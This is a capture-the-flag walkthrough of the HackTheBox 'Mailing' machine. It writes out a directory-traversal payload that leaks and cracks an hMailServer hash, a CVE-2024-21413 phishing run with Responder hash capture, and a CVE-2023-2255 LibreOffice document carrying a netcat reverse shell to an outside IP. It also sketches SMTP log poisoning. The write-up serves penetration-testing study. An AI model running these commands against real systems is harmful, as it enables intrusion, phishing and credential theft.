# HTB: Mailing — A Complete Walkthrough

**By Mursalin**

---

If you've been grinding through HackTheBox machines, Mailing is one of those boxes that genuinely teaches you something. It's rated Easy, runs on Windows, and chains together a few real-world vulnerabilities — a directory traversal, a credential leak, CVE-2024-21413, and a LibreOffice macro exploit. Let's walk through it step by step.

---

## Reconnaissance

As always, we start with an nmap scan to see what we're dealing with:

```
nmap -p- --min-rate 10000 10.10.11.14
nmap -p [ports] -sCV 10.10.11.14
```

The results come back with quite a few open ports. The highlights:

- **Port 80** — HTTP (redirecting to `mailing.htb`)
- **Port 25, 465, 587** — SMTP
- **Port 110, 993** — POP3 / IMAP (powered by hMailServer)
- **Port 445** — SMB
- **Port 5985** — WinRM (interesting if we ever land credentials)

The OS fingerprint lines up with Windows 10 or Server 2019, and the IIS version confirms it's at least IIS 10. I also note that SMB message signing is enabled but not required — file away for later.

Mail ports are all over the place, but they'll likely need credentials. The webserver on port 80 is the obvious starting point.

---

## Web Enumeration

After adding `mailing.htb` to `/etc/hosts`, the site looks like a mail hosting company built on hMailServer. Nothing fancy on the surface — an about section, a team section with three names (**Ruy Alonso**, **Maya Bendito**, **Gregory Smith**), and a "Download Instructions" button.

The download button points to:

```
http://mailing.htb/download.php?file=instructions.pdf
```

That `file=` parameter is immediately suspicious. Let's test it.

I ran `ffuf` to check for subdomains — nothing interesting came back. Then `feroxbuster` for directory brute forcing, also nothing new beyond `download.php`. So all our attention goes to that one endpoint.

---

## Directory Traversal → File Read

Testing the `file` parameter for path traversal:

```bash
curl http://mailing.htb/download.php?file=../../windows/system32/drivers/etc/hosts
```

And it works — we get the Windows hosts file back. The app is literally just prepending a base path to whatever we give it and calling `file_get_contents()`. No sanitization, no jail. The source of `download.php` confirms this when we read it directly:

```php
$file_path = 'C:/wwwroot/instructions/' . $file;
if (file_exists($file_path)) {
    echo file_get_contents($file_path);
}
```

Now we have arbitrary file read on a Windows machine. Let's use it.

---

## Leaking the hMailServer Admin Hash

hMailServer stores its configuration in `hMailServer.ini`. After some research, the file lives at:

```
C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini
```

Reading it via our traversal:

```bash
curl 'http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini'
```

The output includes:

```
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7

[Database]
Password=0a9f8ad8bf896b501dde74f08efd7e4c
```

Two MD5 hashes. I drop them into CrackStation:

- `841bb5acfa6779ae432fd7a4e6600ba7` → **homenetworkingadministrator**
- The second one → Not found

So we have the administrator password for hMailServer. Trying it against SMB as the `administrator` Windows user fails — it's not a local account password, just the mail service's admin password. But it does work for authenticating to the SMTP service, which is exactly what we need.

---

## CVE-2024-21413 — Phishing Maya via Windows Mail

Now we need to get a foothold as a real user. The site mentions the mail client used is Windows Mail (based on the installation instructions PDF). Time to check for known vulnerabilities.

CVE-2024-21413 is a remote code execution vulnerability in Microsoft Outlook and Windows Mail. The flaw lives in how the clients handle `file://` protocol URLs in email bodies. Normally, security restrictions are placed on different protocols. However, researchers found that if a URL ends with `!anything`, those restrictions are silently dropped. When a user opens or even previews an email with such a link, the client automatically tries to authenticate to the attacker's SMB server — handing over a NetNTLMv2 hash.

There's a solid PoC on GitHub by xaitax. I clone it and run it with these parameters:

```bash
python CVE-2024-21413.py \
  --server mailing.htb \
  --port 587 \
  --username administrator@mailing.htb \
  --password homenetworkingadministrator \
  --sender 0xdf@mailing.htb \
  --recipient maya@mailing.htb \
  --url "\\10.10.14.6\share\sploit" \
  --subject "Check this out ASAP!"
```

The email sends successfully. Meanwhile, I have Responder running on my attack machine to catch the incoming authentication:

```bash
sudo /opt/Responder/Responder.py -I tun0
```

A minute or so later, Maya's client opens the email and Responder captures her NetNTLMv2 hash. I crack it with hashcat:

```bash
hashcat -m 5600 maya_hash.txt /usr/share/wordlists/rockyou.txt
```

Password cracked: **m4y4ngs4ri**

---

## Shell as Maya

With Maya's credentials, I connect using Evil-WinRM:

```bash
evil-winrm -i mailing.htb -u maya -p 'm4y4ngs4ri'
```

We're in. The user flag is sitting on Maya's desktop.

---

## Privilege Escalation — CVE-2023-2255 (LibreOffice)

Time to look for a path to root. Poking around the system, there's a share called `Important Documents` and LibreOffice is installed. This is a strong hint toward CVE-2023-2255.

CVE-2023-2255 affects LibreOffice versions before 7.4.7 and 7.5.3. It abuses "floating frames" — linked external files inside `.odt` documents. The vulnerability causes those frames to load without asking the user for permission, and the content can be a macro that executes on document load.

The PoC by elweth-sec generates a malicious `.odt` that embeds a shell command. The document structure embeds a `<script>` tag in `content.xml` that fires the moment LibreOffice opens the file.

I generate a reverse shell payload:

```bash
python /opt/CVE-2023-2255/CVE-2023-2255.py \
  --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.6 443' \
  --output exploit.odt
```

Then upload both the `.odt` file and `nc64.exe` to the `Important Documents` SMB share using Maya's credentials:

```bash
smbclient '//10.10.11.14/important documents' --user maya --password m4y4ngs4ri
smb: \> put exploit.odt
smb: \> put nc64.exe
```

From Maya's WinRM shell, I copy `nc64.exe` to `C:\ProgramData` so the macro can find it:

```powershell
copy "\Important Documents\nc64.exe" nc64.exe
```

After a minute or two, something on the box opens the document (likely an automated scheduled task), and I catch a shell at my netcat listener:

```
rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.14
Microsoft Windows [Version 10.0.19045.4355]

C:\Program Files\LibreOffice\program> whoami
mailing\localadmin
```

We're running as `localadmin` — and the root flag is on the Desktop.

---

## Bonus: The Unintended Path (Pre-Patch)

The box was patched on May 15, 2024 — just 11 days after release — because the original `download.php` actually used PHP's `include()` instead of `file_get_contents()`. That turned a simple file read into a full Local File Inclusion vulnerability, meaning any PHP code in a readable file would be executed.

The unintended path was to poison hMailServer's SMTP logs (by connecting via telnet and injecting PHP in the HELO command), then include that log file via the LFI to achieve code execution as `defaultapppool`. From there, `SeImpersonatePrivilege` + GodPotato = SYSTEM. A whole different route to root.

---

## Summary

The attack chain on Mailing goes like this:

1. **File read** via directory traversal in `download.php`
2. **Credential leak** from `hMailServer.ini` → crack the MD5 admin hash
3. **CVE-2024-21413** → phish Maya, capture and crack her NetNTLMv2 hash
4. **WinRM shell** as Maya using cracked credentials
5. **CVE-2023-2255** → malicious LibreOffice document dropped to a watched share → shell as localadmin

This box does a great job of chaining real CVEs together in a way that feels believable. The exploitation steps aren't overly complex, but you need to understand what you're doing at each stage. Definitely one worth revisiting if you're studying for OSCP.

---

*Thanks for reading! Follow me on Medium for more HTB writeups and CTF content.*

*— Mursalin*
